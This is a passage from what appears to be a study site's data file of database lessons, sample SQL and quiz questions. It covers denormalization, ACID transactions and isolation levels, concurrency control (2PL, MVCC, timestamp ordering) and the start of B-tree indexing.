table</td></tr><tr><td>Precomputed aggregates</td><td>Store derived values</td><td>Store order_count in Customer table</td></tr><tr><td>Materialized views</td><td>Cached query results</td><td>Pre-join common query patterns</td></tr><tr><td>Merge tables</td><td>Combine 1:1 related tables</td><td>Merge Employee and EmployeeDetails</td></tr><tr><td>Denormalized history</td><td>Store snapshot data</td><td>Store product_name in OrderItem (not just product_id)</td></tr></table><div class="learn-code">-- Normalized: requires JOIN for every order display\nSELECT o.order_id, c.name, p.product_name, oi.quantity\nFROM Orders o\nJOIN Customers c ON o.customer_id = c.id\nJOIN OrderItems oi ON o.order_id = oi.order_id\nJOIN Products p ON oi.product_id = p.id;\n\n-- Denormalized: redundant columns avoid JOINs\nSELECT order_id, customer_name, product_name, quantity\nFROM OrderDetails;  -- single table with redundant data</div></div><div class="learn-section"><div class="learn-h">Maintaining Consistency in Denormalized Data</div><p class="learn-p">The biggest challenge of denormalization is keeping redundant data consistent. Common strategies:</p><ol class="learn-list"><li><b>Triggers</b> — Automatically update redundant columns when source data changes</li><li><b>Application-level logic</b> — The application ensures all copies are updated in a transaction</li><li><b>Batch jobs</b> — Periodically sync denormalized data (acceptable for near-real-time use cases)</li><li><b>Event sourcing / CDC</b> — Capture changes and propagate to denormalized stores</li></ol><div class="learn-code">-- Trigger to maintain denormalized order_count in Customer\nCREATE TRIGGER update_order_count\nAFTER INSERT ON Orders\nFOR EACH ROW\nBEGIN\n    UPDATE Customers\n    SET order_count = order_count + 1\n    WHERE id = NEW.customer_id;\nEND;</div></div><div class="learn-section"><div class="learn-h">Normalization vs Denormalization</div><table class="learn-table"><tr><th>Aspect</th><th>Normalization</th><th>Denormalization</th></tr><tr><td>Redundancy</td><td>Minimized</td><td>Controlled increase</td></tr><tr><td>Read performance</td><td>Slower (many JOINs)</td><td>Faster (fewer JOINs)</td></tr><tr><td>Write performance</td><td>Faster (single update)</td><td>Slower (update multiple copies)</td></tr><tr><td>Storage</td><td>Less</td><td>More</td></tr><tr><td>Data consistency</td><td>Easier to maintain</td><td>Risk of inconsistency</td></tr><tr><td>Schema complexity</td><td>More tables</td><td>Fewer tables, wider rows</td></tr><tr><td>Best for</td><td>OLTP (transactional)</td><td>OLAP (analytical), read-heavy</td></tr></table><div class="learn-tip"><b>Tip:</b> In interviews, when asked about denormalization, always mention that you would normalize first, then denormalize specific pain points based on query patterns and performance metrics. Never denormalize blindly.</div></div><div class="learn-section"><div class="learn-h">Real-World Examples</div><p class="learn-p"><b>E-commerce order history</b>: When you view an old order, you see the product name and price <i>at the time of purchase</i>, not the current product name/price. This is denormalization — the order stores a snapshot of the product data.</p><p class="learn-p"><b>Social media feeds</b>: Instead of joining User → Posts → Comments → Likes for every feed load, the feed is precomputed and stored in a denormalized cache (like a materialized view).</p><p class="learn-p"><b>Data warehousing</b>: Star schemas and snowflake schemas in data warehouses are denormalized designs optimized for analytical queries.</p></div>',
          code: `-- =============================================
-- Denormalization: Examples & Strategies
-- =============================================

-- ===== NORMALIZED DESIGN =====

CREATE TABLE Customers (
    customer_id   INT PRIMARY KEY,
    name          VARCHAR(100),
    email         VARCHAR(200)
);

CREATE TABLE Products (
    product_id    INT PRIMARY KEY,
    product_name  VARCHAR(200),
    price         DECIMAL(10,2)
);

CREATE TABLE Orders (
    order_id      INT PRIMARY KEY,
    customer_id   INT,
    order_date    DATE,
    FOREIGN KEY (customer_id) REFERENCES Customers(customer_id)
);

CREATE TABLE OrderItems (
    order_id    INT,
    product_id  INT,
    quantity    INT,
    PRIMARY KEY (order_id, product_id),
    FOREIGN KEY (order_id)   REFERENCES Orders(order_id),
    FOREIGN KEY (product_id) REFERENCES Products(product_id)
);

-- Common query requires 4-table join
SELECT c.name, o.order_date, p.product_name, oi.quantity, p.price
FROM Orders o
JOIN Customers c  ON o.customer_id = c.customer_id
JOIN OrderItems oi ON o.order_id = oi.order_id
JOIN Products p   ON oi.product_id = p.product_id
WHERE c.customer_id = 123;

-- ===== DENORMALIZED DESIGN =====

-- Technique 1: Redundant columns
ALTER TABLE Orders ADD customer_name VARCHAR(100);
-- Now simple order listing doesn't need Customer JOIN

-- Technique 2: Snapshot data in OrderItems
ALTER TABLE OrderItems
    ADD product_name VARCHAR(200),
    ADD unit_price   DECIMAL(10,2);
-- Stores price at time of purchase (business requirement too!)

-- Technique 3: Precomputed aggregates
ALTER TABLE Customers
    ADD total_orders INT DEFAULT 0,
    ADD total_spent  DECIMAL(12,2) DEFAULT 0;

-- Trigger to maintain aggregates
DELIMITER //
CREATE TRIGGER after_order_insert
AFTER INSERT ON Orders
FOR EACH ROW
BEGIN
    UPDATE Customers
    SET total_orders = total_orders + 1
    WHERE customer_id = NEW.customer_id;
END //
DELIMITER ;

-- Technique 4: Materialized aggregation table
CREATE TABLE DailySalesSummary (
    sale_date    DATE PRIMARY KEY,
    total_orders INT,
    total_revenue DECIMAL(12,2),
    avg_order_value DECIMAL(10,2)
);

-- Refresh daily via batch job
INSERT INTO DailySalesSummary
SELECT o.order_date,
       COUNT(DISTINCT o.order_id),
       SUM(oi.quantity * oi.unit_price),
       AVG(oi.quantity * oi.unit_price)
FROM Orders o
JOIN OrderItems oi ON o.order_id = oi.order_id
WHERE o.order_date = CURDATE() - INTERVAL 1 DAY
GROUP BY o.order_date
ON DUPLICATE KEY UPDATE
    total_orders = VALUES(total_orders),
    total_revenue = VALUES(total_revenue),
    avg_order_value = VALUES(avg_order_value);

-- Technique 5: Merge 1:1 tables
-- Instead of separate Employee and EmployeeDetails tables:
CREATE TABLE EmployeeFull (
    emp_id     INT PRIMARY KEY,
    name       VARCHAR(100),
    salary     DECIMAL(10,2),
    -- Details that were in a separate table:
    address    VARCHAR(500),
    emergency_contact VARCHAR(100),
    blood_group CHAR(3)
);`,
          problems: [
            ['Normalization vs Denormalization', 'https://www.geeksforgeeks.org/denormalization-in-databases/', 'Easy'],
            ['Star Schema Design', 'https://www.geeksforgeeks.org/star-schema-in-data-warehouse-modeling/', 'Medium']
          ],
          mcqs: [
            {q: 'Denormalization is most beneficial for:', o: ['Write-heavy OLTP systems', 'Read-heavy analytical queries', 'Systems with very little data', 'Systems where storage is the main constraint'], a: 1},
            {q: 'Which of the following is NOT a way to maintain consistency in denormalized data?', o: ['Database triggers', 'Application-level logic', 'Dropping all foreign keys', 'Batch synchronization jobs'], a: 2},
            {q: 'Storing the product name and price in the OrderItems table (instead of just product_id) is an example of:', o: ['Normalization', 'First normal form', 'Denormalization with snapshot data', 'Referential integrity'], a: 2}
          ]
        }
      ]
    },
    {
      id: 'txn', t: 'Transactions',
      topics: [
        {
          t: 'ACID Properties & Isolation Levels',
          learn: '<div class="learn-section"><div class="learn-h">What is a Transaction?</div><p class="learn-p">A <b>transaction</b> is a logical unit of work that consists of one or more SQL operations. It either completes entirely (<b>commit</b>) or has no effect at all (<b>rollback</b>). Transactions are essential for maintaining data integrity in multi-user database environments.</p><div class="learn-code">START TRANSACTION;\n    UPDATE Accounts SET balance = balance - 500 WHERE acc_id = 1;\n    UPDATE Accounts SET balance = balance + 500 WHERE acc_id = 2;\nCOMMIT;  -- Both succeed, or neither (on error: ROLLBACK)</div></div><div class="learn-section"><div class="learn-h">ACID Properties</div><p class="learn-p">Every transaction must satisfy four properties, known as <b>ACID</b>:</p><table class="learn-table"><tr><th>Property</th><th>Meaning</th><th>Ensured By</th></tr><tr><td><b>Atomicity</b></td><td>All operations succeed or none do — "all or nothing"</td><td>Transaction manager, undo log</td></tr><tr><td><b>Consistency</b></td><td>Transaction brings DB from one valid state to another; all constraints satisfied</td><td>Application logic + DB constraints</td></tr><tr><td><b>Isolation</b></td><td>Concurrent transactions don\'t interfere with each other</td><td>Concurrency control (locks, MVCC)</td></tr><tr><td><b>Durability</b></td><td>Once committed, changes survive crashes</td><td>Write-Ahead Log (WAL), redo log</td></tr></table><div class="learn-tip"><b>Tip:</b> In interviews, explain ACID with the classic bank transfer example: transferring $500 from Account A to Account B. Atomicity = both debits and credits happen or neither. Consistency = total balance is preserved. Isolation = concurrent transfers don\'t see partial states. Durability = committed transfer survives a power failure.</div></div><div class="learn-section"><div class="learn-h">Transaction States</div><p class="learn-p">A transaction goes through these states:</p><ol class="learn-list"><li><b>Active</b> — Transaction is executing operations</li><li><b>Partially Committed</b> — Final operation executed, waiting for commit</li><li><b>Committed</b> — Changes made permanent</li><li><b>Failed</b> — An error occurred, cannot proceed</li><li><b>Aborted</b> — Rolled back, database restored to pre-transaction state</li></ol><p class="learn-p">After abort, the transaction can be <b>restarted</b> (if the failure was transient) or <b>killed</b> (if the failure is permanent, like a constraint violation).</p></div><div class="learn-section"><div class="learn-h">Problems in Concurrent Transactions</div><p class="learn-p">Without proper isolation, concurrent transactions can cause these <b>anomalies</b>:</p><table class="learn-table"><tr><th>Anomaly</th><th>Description</th><th>Example</th></tr><tr><td><b>Dirty Read</b></td><td>T2 reads uncommitted data written by T1; T1 later rolls back</td><td>T1 updates salary to 100K (not committed). T2 reads 100K. T1 rolls back.</td></tr><tr><td><b>Non-repeatable Read</b></td><td>T1 reads a value, T2 modifies it and commits, T1 re-reads and gets a different value</td><td>T1 reads salary=80K. T2 updates to 90K and commits. T1 re-reads: salary=90K.</td></tr><tr><td><b>Phantom Read</b></td><td>T1 reads a set of rows, T2 inserts/deletes rows that match T1\'s condition, T1 re-reads and gets different rows</td><td>T1: SELECT * WHERE dept=\'Eng\' (3 rows). T2 inserts a new Eng employee. T1 re-reads: 4 rows.</td></tr><tr><td><b>Lost Update</b></td><td>Two transactions read the same value and update it; one update is lost</td><td>Both T1 and T2 read balance=1000. T1 sets 1100, T2 sets 1200. Final: 1200 (T1\'s update lost).</td></tr></table></div><div class="learn-section"><div class="learn-h">SQL Isolation Levels</div><p class="learn-p">SQL standard defines four isolation levels, trading off correctness for performance:</p><table class="learn-table"><tr><th>Isolation Level</th><th>Dirty Read</th><th>Non-repeatable Read</th><th>Phantom Read</th></tr><tr><td>READ UNCOMMITTED</td><td>Possible</td><td>Possible</td><td>Possible</td></tr><tr><td>READ COMMITTED</td><td>Prevented</td><td>Possible</td><td>Possible</td></tr><tr><td>REPEATABLE READ</td><td>Prevented</td><td>Prevented</td><td>Possible</td></tr><tr><td>SERIALIZABLE</td><td>Prevented</td><td>Prevented</td><td>Prevented</td></tr></table><div class="learn-code">-- Set isolation level\nSET TRANSACTION ISOLATION LEVEL REPEATABLE READ;\n\n-- Or for the session\nSET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;</div><p class="learn-p"><b>Default isolation levels</b>:</p><ul class="learn-list"><li><b>MySQL (InnoDB)</b>: REPEATABLE READ (but uses next-key locking to also prevent phantoms in practice)</li><li><b>PostgreSQL</b>: READ COMMITTED</li><li><b>SQL Server</b>: READ COMMITTED</li><li><b>Oracle</b>: READ COMMITTED</li></ul><div class="learn-warn"><b>Warning:</b> SERIALIZABLE provides the strongest guarantees but severely limits concurrency. In practice, most systems use READ COMMITTED or REPEATABLE READ with application-level optimistic concurrency control.</div></div><div class="learn-section"><div class="learn-h">Serializability</div><p class="learn-p">A schedule (sequence of operations from concurrent transactions) is <b>serializable</b> if its result is equivalent to some serial execution of the transactions.</p><ul class="learn-list"><li><b>Conflict Serializability</b>: Two operations conflict if they are from different transactions, access the same data, and at least one is a write. A schedule is conflict-serializable if it can be transformed into a serial schedule by swapping non-conflicting operations. Tested using a <b>precedence graph</b> — if acyclic, the schedule is conflict-serializable.</li><li><b>View Serializability</b>: Weaker condition based on reads-from and final-write relationships. Every conflict-serializable schedule is view-serializable, but not vice versa.</li></ul><div class="learn-code">-- Precedence graph example\n-- T1: R(A), W(A)     T2: R(A), W(A)\n-- Schedule: R1(A) R2(A) W1(A) W2(A)\n-- Conflicts: R1-W2(A): T1->T2, R2-W1(A): T2->T1\n-- Cycle exists! NOT conflict-serializable.</div><div class="learn-tip"><b>Tip:</b> To check conflict serializability: (1) identify all conflicting pairs, (2) draw directed edges in the precedence graph, (3) check for cycles. No cycle = conflict serializable.</div></div><div class="learn-section"><div class="learn-h">Distributed Transactions: Two-Phase Commit (2PC)</div><p class="learn-p">When a transaction spans <b>multiple databases or services</b>, a single COMMIT is not enough. <b>2PC</b> is a protocol that ensures all participants either commit or abort together.</p><div class="learn-code">2PC Protocol:\n\nCoordinator                  Participants (DB1, DB2, ...)\n    |                              |\n    |--- Phase 1: PREPARE --------&gt;|\n    |    "Can you commit?"          |  Each participant:\n    |                               |  - Writes redo/undo logs\n    |&lt;-- VOTE (YES or NO) ---------|  - Acquires locks\n    |                               |  - Replies YES (ready) or NO\n    |\n    | If ALL vote YES:\n    |--- Phase 2: COMMIT ----------&gt;|  Participants commit &amp; release locks\n    |&lt;-- ACK -----------------------|\n    |\n    | If ANY votes NO:\n    |--- Phase 2: ABORT -----------&gt;|  Participants rollback &amp; release locks\n    |&lt;-- ACK -----------------------|</div><p class="learn-p"><b>2PC guarantees atomicity</b> across distributed systems but has a critical flaw: if the coordinator crashes after sending PREPARE but before sending COMMIT/ABORT, participants are <b>blocked</b> — they hold locks indefinitely, waiting for a decision they\'ll never receive.</p></div><div class="learn-section"><div class="learn-h">Three-Phase Commit (3PC)</div><p class="learn-p"><b>3PC</b> adds a <b>PRE-COMMIT</b> phase between PREPARE and COMMIT to reduce blocking:</p><div class="learn-code">3PC Protocol:\nPhase 1: PREPARE    → Participants vote YES/NO (same as 2PC)\nPhase 2: PRE-COMMIT → Coordinator tells all "we WILL commit"\n                      (participants can now safely commit on timeout)\nPhase 3: COMMIT     → Actual commit\n\nKey difference: If coordinator crashes after PRE-COMMIT,\nparticipants can safely commit on timeout (they know everyone\nvoted YES). In 2PC, they\'d be stuck.</div><table class="learn-table"><tr><th>Feature</th><th>2PC</th><th>3PC</th></tr><tr><td>Blocking on coordinator failure</td><td>Yes (major flaw)</td><td>No (participants can decide)</td></tr><tr><td>Message complexity</td><td>Lower (2 rounds)</td><td>Higher (3 rounds)</td></tr><tr><td>Network partition tolerance</td><td>No</td><td>No (can cause inconsistency)</td></tr><tr><td>Used in practice</td><td>Yes (XA transactions, databases)</td><td>Rarely (Saga pattern preferred)</td></tr></table><div class="learn-tip"><b>Interview tip:</b> In modern microservice architectures, 2PC/3PC are largely replaced by the <b>Saga pattern</b> — a sequence of local transactions with compensating actions for rollback. Each service commits locally and publishes an event; if a step fails, compensating transactions undo previous steps.</div></div>',
          code: `-- =============================================
-- ACID Properties & Isolation Levels
-- =============================================

-- Setup
CREATE TABLE Accounts (
    acc_id   INT PRIMARY KEY,
    name     VARCHAR(100),
    balance  DECIMAL(12,2) CHECK (balance >= 0)
);
INSERT INTO Accounts VALUES (1, 'Alice', 10000), (2, 'Bob', 5000);

-- ===== ATOMICITY: Bank Transfer =====
START TRANSACTION;
    UPDATE Accounts SET balance = balance - 3000 WHERE acc_id = 1;
    UPDATE Accounts SET balance = balance + 3000 WHERE acc_id = 2;
    -- If any statement fails, rollback both
COMMIT;

-- With error handling
START TRANSACTION;
    UPDATE Accounts SET balance = balance - 3000 WHERE acc_id = 1;
    -- Simulate error: this would violate CHECK constraint
    -- UPDATE Accounts SET balance = balance - 99999 WHERE acc_id = 1;
ROLLBACK;  -- Undo everything if error detected

-- ===== SAVEPOINTS =====
START TRANSACTION;
    UPDATE Accounts SET balance = balance - 1000 WHERE acc_id = 1;
    SAVEPOINT sp1;
    UPDATE Accounts SET balance = balance + 1000 WHERE acc_id = 2;
    -- Oops, wrong account. Rollback to savepoint
    ROLLBACK TO sp1;
    UPDATE Accounts SET balance = balance + 1000 WHERE acc_id = 3;
COMMIT;

-- ===== ISOLATION LEVELS =====

-- Session 1: Read Uncommitted (dirty reads possible)
SET SESSION TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;
-- May see uncommitted data from other transactions
COMMIT;

-- Session 1: Read Committed (no dirty reads)
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;  -- reads 10000
-- Another transaction commits: balance = 7000
SELECT balance FROM Accounts WHERE acc_id = 1;  -- reads 7000 (different!)
COMMIT;

-- Session 1: Repeatable Read (consistent reads within transaction)
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;  -- reads 10000
-- Another transaction commits: balance = 7000
SELECT balance FROM Accounts WHERE acc_id = 1;  -- still reads 10000!
COMMIT;

-- Session 1: Serializable (full isolation)
SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE;
START TRANSACTION;
SELECT * FROM Accounts WHERE balance > 5000;
-- Other transactions cannot insert/update rows matching this condition
COMMIT;

-- ===== CHECKING ISOLATION LEVEL =====
SELECT @@transaction_isolation;  -- MySQL 8+
-- or
SELECT @@tx_isolation;           -- MySQL 5.x

-- ===== DEADLOCK EXAMPLE =====
-- Session 1:
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 100 WHERE acc_id = 1; -- locks row 1
-- UPDATE Accounts SET balance = balance + 100 WHERE acc_id = 2; -- waits for row 2

-- Session 2 (concurrent):
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 200 WHERE acc_id = 2; -- locks row 2
-- UPDATE Accounts SET balance = balance + 200 WHERE acc_id = 1; -- waits for row 1
-- DEADLOCK! DBMS detects and rolls back one transaction.`,
          problems: [
            ['ACID Properties', 'https://www.geeksforgeeks.org/acid-properties-in-dbms/', 'Easy'],
            ['Conflict Serializability', 'https://www.geeksforgeeks.org/conflict-serializability-in-dbms/', 'Medium'],
            ['Isolation Levels', 'https://www.geeksforgeeks.org/transaction-isolation-levels-dbms/', 'Medium'],
            ['Precedence Graph', 'https://www.geeksforgeeks.org/precedence-graph-for-testing-conflict-serializability-in-dbms/', 'Hard']
          ],
          mcqs: [
            {q: 'Which ACID property is ensured by the Write-Ahead Log (WAL)?', o: ['Atomicity', 'Consistency', 'Isolation', 'Durability'], a: 3},
            {q: 'At which isolation level can a dirty read occur?', o: ['READ UNCOMMITTED', 'READ COMMITTED', 'REPEATABLE READ', 'SERIALIZABLE'], a: 0},
            {q: 'A precedence graph for a schedule is acyclic. This means the schedule is:', o: ['Not serializable', 'View serializable only', 'Conflict serializable', 'Neither conflict nor view serializable'], a: 2}
          ]
        }
      ]
    },
    {
      id: 'conc', t: 'Concurrency Control',
      topics: [
        {
          t: 'Concurrency Control (Lock-Based, 2PL, MVCC, Timestamp Ordering)',
          learn: '<div class="learn-section"><div class="learn-h">Why Concurrency Control?</div><p class="learn-p"><b>Concurrency control</b> ensures that concurrent transactions execute correctly — producing results equivalent to some serial execution — while maximizing throughput. Without it, transactions can interfere with each other, causing anomalies like dirty reads, lost updates, and inconsistent retrievals.</p><p class="learn-p">The main approaches to concurrency control are:</p><ol class="learn-list"><li><b>Lock-based protocols</b> (pessimistic)</li><li><b>Timestamp ordering</b> (optimistic/pessimistic)</li><li><b>Multiversion Concurrency Control (MVCC)</b></li><li><b>Optimistic Concurrency Control (OCC)</b></li></ol></div><div class="learn-section"><div class="learn-h">Lock-Based Concurrency Control</div><p class="learn-p">Transactions acquire <b>locks</b> on data items before accessing them. Lock types:</p><table class="learn-table"><tr><th>Lock Type</th><th>Also Called</th><th>Allows</th></tr><tr><td>Shared (S)</td><td>Read lock</td><td>Multiple transactions can hold S locks simultaneously</td></tr><tr><td>Exclusive (X)</td><td>Write lock</td><td>Only one transaction can hold X lock; no other S or X allowed</td></tr></table><p class="learn-p"><b>Lock compatibility matrix:</b></p><table class="learn-table"><tr><th></th><th>S held</th><th>X held</th></tr><tr><td>Request S</td><td>Granted</td><td>Wait</td></tr><tr><td>Request X</td><td>Wait</td><td>Wait</td></tr></table><div class="learn-warn"><b>Warning:</b> Simple locking without a protocol does not guarantee serializability. Consider: T1 locks A, reads A, unlocks A, then locks B, writes B, unlocks B. Another transaction can modify A between T1\'s unlock and T1\'s lock of B, causing inconsistency.</div></div><div class="learn-section"><div class="learn-h">Two-Phase Locking (2PL)</div><p class="learn-p"><b>2PL</b> is the most widely used lock-based protocol. It divides a transaction into two phases:</p><ol class="learn-list"><li><b>Growing phase</b>: Transaction may acquire locks but <b>cannot release</b> any lock</li><li><b>Shrinking phase</b>: Transaction may release locks but <b>cannot acquire</b> any new lock</li></ol><p class="learn-p">2PL guarantees <b>conflict serializability</b> but does <b>not</b> prevent deadlocks.</p><p class="learn-p"><b>Variants of 2PL:</b></p><table class="learn-table"><tr><th>Variant</th><th>Description</th><th>Prevents Cascading Abort?</th></tr><tr><td>Basic 2PL</td><td>Locks released in shrinking phase</td><td>No</td></tr><tr><td>Strict 2PL</td><td>All X (write) locks held until commit/abort</td><td>Yes</td></tr><tr><td>Rigorous 2PL</td><td>ALL locks (S and X) held until commit/abort</td><td>Yes + simpler</td></tr></table><div class="learn-tip"><b>Tip:</b> Most practical database systems use <b>Strict 2PL</b>. It ensures that no other transaction reads or writes data modified by a transaction until it commits, preventing cascading aborts.</div></div><div class="learn-section"><div class="learn-h">Deadlock Handling</div><p class="learn-p">A <b>deadlock</b> occurs when two or more transactions are waiting for each other\'s locks, forming a cycle.</p><p class="learn-p"><b>Deadlock prevention</b> (avoid deadlocks before they happen):</p><ul class="learn-list"><li><b>Wait-Die</b> (non-preemptive): Older transaction waits for younger; younger transaction is aborted (dies) if it requests a lock held by an older one.</li><li><b>Wound-Wait</b> (preemptive): Older transaction "wounds" (aborts) younger; younger transaction waits for older.</li></ul><p class="learn-p"><b>Deadlock detection</b>: Build a <b>wait-for graph</b>. If a cycle exists, a deadlock is detected. One transaction in the cycle is chosen as a <b>victim</b> and rolled back.</p><p class="learn-p"><b>Deadlock detection</b> is used by most modern DBMS (e.g., InnoDB detects deadlocks and rolls back the transaction with the fewest locks).</p></div><div class="learn-section"><div class="learn-h">Timestamp Ordering Protocol</div><p class="learn-p">Each transaction T is assigned a unique <b>timestamp TS(T)</b> when it starts. The protocol ensures that conflicting operations execute in timestamp order.</p><p class="learn-p">For each data item Q, maintain:</p><ul class="learn-list"><li><b>W-timestamp(Q)</b>: Largest TS of any transaction that successfully wrote Q</li><li><b>R-timestamp(Q)</b>: Largest TS of any transaction that successfully read Q</li></ul><p class="learn-p"><b>Read rule</b>: T wants to read Q. If TS(T) &lt; W-timestamp(Q), T is too old — reading a value that was already overwritten. T is rolled back.</p><p class="learn-p"><b>Write rule</b>: T wants to write Q. If TS(T) &lt; R-timestamp(Q), T is trying to overwrite a value already read by a newer transaction. T is rolled back. If TS(T) &lt; W-timestamp(Q), T\'s write is obsolete — use <b>Thomas\' Write Rule</b> to simply ignore the write (skip it) instead of aborting.</p></div><div class="learn-section"><div class="learn-h">Multiversion Concurrency Control (MVCC)</div><p class="learn-p"><b>MVCC</b> maintains <b>multiple versions</b> of each data item. Readers see a <b>consistent snapshot</b> from their transaction\'s start time, while writers create new versions. This means <b>readers never block writers, and writers never block readers</b>.</p><p class="learn-p">How MVCC works:</p><ol class="learn-list"><li>Each row has hidden version fields (e.g., <code>created_txn_id</code> and <code>deleted_txn_id</code>)</li><li>A read sees the version that was latest at the transaction\'s start time</li><li>A write creates a new version rather than overwriting</li><li>Old versions are garbage-collected when no transaction needs them</li></ol><p class="learn-p"><b>Used by</b>: PostgreSQL, MySQL InnoDB, Oracle, SQL Server (snapshot isolation)</p><div class="learn-tip"><b>Tip:</b> MVCC is the reason PostgreSQL and InnoDB can offer high concurrency. In PostgreSQL, every UPDATE actually creates a new row version (tuple), and the old version is later removed by VACUUM.</div></div><div class="learn-section"><div class="learn-h">Lock Granularity</div><p class="learn-p">Locks can be applied at different levels of granularity:</p><ul class="learn-list"><li><b>Row-level</b> — Most granular, highest concurrency, most overhead</li><li><b>Page-level</b> — Locks a disk page (group of rows)</li><li><b>Table-level</b> — Least granular, lowest concurrency, least overhead</li><li><b>Database-level</b> — Entire database locked</li></ul><p class="learn-p"><b>Intention locks</b> (IS, IX, SIX) allow a transaction to signal its intent to acquire finer-grained locks, enabling the system to check compatibility without scanning all lower-level locks.</p></div>',
          code: `-- =============================================
-- Concurrency Control Demonstrations
-- =============================================

-- ===== LOCK-BASED CONTROL =====

-- MySQL InnoDB uses row-level locking by default

-- Shared (read) lock
START TRANSACTION;
SELECT * FROM Accounts WHERE acc_id = 1 LOCK IN SHARE MODE;
-- Other transactions can also read with LOCK IN SHARE MODE
-- but cannot UPDATE until this transaction commits
COMMIT;

-- Exclusive (write) lock
START TRANSACTION;
SELECT * FROM Accounts WHERE acc_id = 1 FOR UPDATE;
-- Exclusive lock: no other transaction can read (with lock) or write
UPDATE Accounts SET balance = balance - 500 WHERE acc_id = 1;
COMMIT;

-- ===== DEMONSTRATING 2PL =====

-- Strict 2PL (default in InnoDB):
-- All write locks held until COMMIT

-- Transaction T1:
START TRANSACTION;
UPDATE Accounts SET balance = balance - 100 WHERE acc_id = 1;
-- X-lock on acc_id=1 acquired, held until COMMIT
UPDATE Accounts SET balance = balance + 100 WHERE acc_id = 2;
-- X-lock on acc_id=2 acquired, held until COMMIT
COMMIT;
-- Both locks released at COMMIT (Strict 2PL)

-- ===== DEADLOCK SCENARIO =====

-- Session 1:
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 100 WHERE acc_id = 1;
-- -- holds X-lock on acc_id=1
-- -- now tries to lock acc_id=2 (Session 2 holds it)
-- UPDATE Accounts SET balance = balance + 100 WHERE acc_id = 2;

-- Session 2 (concurrent):
-- START TRANSACTION;
-- UPDATE Accounts SET balance = balance - 50 WHERE acc_id = 2;
-- -- holds X-lock on acc_id=2
-- -- now tries to lock acc_id=1 (Session 1 holds it)
-- UPDATE Accounts SET balance = balance + 50 WHERE acc_id = 1;
-- -- DEADLOCK DETECTED! InnoDB rolls back one transaction.

-- Check for deadlocks:
SHOW ENGINE INNODB STATUS;  -- includes latest deadlock info

-- ===== MVCC in action (MySQL InnoDB) =====

-- Session 1 (REPEATABLE READ):
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;
START TRANSACTION;
SELECT balance FROM Accounts WHERE acc_id = 1;
-- Reads from a consistent snapshot (e.g., balance = 10000)

-- Session 2 (commits between Session 1's reads):
-- START TRANSACTION;
-- UPDATE Accounts SET balance = 7000 WHERE acc_id = 1;
-- COMMIT;

-- Back to Session 1:
SELECT balance FROM Accounts WHERE acc_id = 1;
-- MVCC: Still reads 10000 (from the snapshot at transaction start)
COMMIT;

-- ===== OPTIMISTIC CONCURRENCY CONTROL (Application-Level) =====

-- Step 1: Read with version
SELECT balance, version FROM Accounts WHERE acc_id = 1;
-- Returns: balance=10000, version=5

-- Step 2: Application processes... then writes with version check
UPDATE Accounts
SET balance = 9000, version = version + 1
WHERE acc_id = 1 AND version = 5;
-- If ROW_COUNT() = 0, another transaction modified it => retry!

-- ===== LOCK GRANULARITY =====

-- Table-level lock (MyISAM or explicit)
LOCK TABLES Accounts WRITE;
-- ... operations ...
UNLOCK TABLES;

-- Row-level lock (InnoDB default with indexes)
SELECT * FROM Accounts WHERE acc_id = 1 FOR UPDATE;
-- Only locks the specific row (if acc_id has an index)`,
          problems: [
            ['Two Phase Locking', 'https://www.geeksforgeeks.org/two-phase-locking-protocol/', 'Medium'],
            ['Deadlock Detection', 'https://www.geeksforgeeks.org/deadlock-in-dbms/', 'Medium'],
            ['MVCC Explained', 'https://www.geeksforgeeks.org/multiversion-concurrency-control-mvcc-in-dbms/', 'Hard']
          ],
          mcqs: [
            {q: 'Two-Phase Locking (2PL) guarantees:', o: ['Freedom from deadlocks', 'Conflict serializability', 'Both deadlock freedom and serializability', 'View serializability only'], a: 1},
            {q: 'In MVCC, what happens when a reader and writer access the same data concurrently?', o: ['The reader blocks until the writer commits', 'The writer blocks until the reader finishes', 'Both proceed without blocking — reader sees a snapshot', 'A deadlock occurs'], a: 2},
            {q: 'In the Wait-Die deadlock prevention scheme:', o: ['Older transactions always abort', 'Younger transactions wait for older ones', 'Older transactions wait for younger; younger abort if they request a lock held by older', 'All transactions are aborted and restarted'], a: 2}
          ]
        }
      ]
    },
    {
      id: 'idx', t: 'Indexing',
      topics: [
        {
          t: 'B-Tree, B+ Tree & Hash Indexing',
          learn: '<div class="learn-section"><div class="learn-h">Why Indexing?</div><p class="learn-p">Without indexes, the DBMS must perform a <b>full table scan</b> to find matching rows — examining every row in the table. For a table with millions of rows, this is extremely slow. An <b>index</b> is a data structure that allows the DBMS to find rows efficiently, similar to a book\'s index.</p><p class="learn-p">Indexes are stored separately from the data and maintain pointers (row IDs or page addresses) to the actual data.</p></div><div class="learn-section"><div class="learn-h">B-Tree Index</div><p class="learn-p">A <b>B-Tree</b> (Balanced Tree) of order m has these properties:</p><ul class="learn-list"><li>Every node has at most <b>m</b> children</li><li>Every non-leaf node (except root) has at least <b>⌈m/2⌉</b> children</li><li>The root has at least 2 children (unless it\'s a leaf)</li><li>All leaves are at the <b>same level</b> (balanced)</li><li>A node with k children has k-1 keys</li><li><b>Both internal nodes and leaf nodes</b> store data pointers</li></ul><p class="learn-p">B-Trees keep the tree balanced, ensuring <span class="learn-complexity">O(log n)</span> search, insert, and delete operations.</p></div><div class="learn-section"><div class="learn-h">B+ Tree Index</div><p class="learn-p">The <b>B+ Tree</b> is the most widely used index structure in databases (MySQL InnoDB, PostgreSQL, Oracle, SQL Server). It differs from B-Tree in key ways:</p><table class="learn-table"><tr><th>Feature</th><th>B-Tree</th><th>B+ Tree</th></tr><tr><td>Data pointers</td><td>In both internal and leaf nodes</td><td>Only in leaf nodes</td></tr><tr><td>Leaf nodes linked?</td><td>No</td><td>Yes (doubly linked list)</td></tr><tr><td>Keys in internal nodes</td><td>Unique</td><td>Copies (also appear in leaves)</td></tr><tr><td>Range queries</td><td>Requires tree 